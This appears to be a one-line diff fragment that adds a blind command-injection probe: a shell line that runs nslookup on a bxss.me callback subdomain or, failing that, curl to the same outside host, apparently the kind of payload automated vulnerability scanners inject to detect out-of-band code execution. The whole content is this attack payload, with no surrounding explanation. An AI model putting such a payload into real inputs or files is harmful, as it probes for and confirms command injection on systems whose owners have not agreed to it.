@@ -1,0 +1,1 @@
+(nslookup -q=cname hitqgacpijbjs3da3d.bxss.me||curl hitqgacpijbjs3da3d.bxss.me))
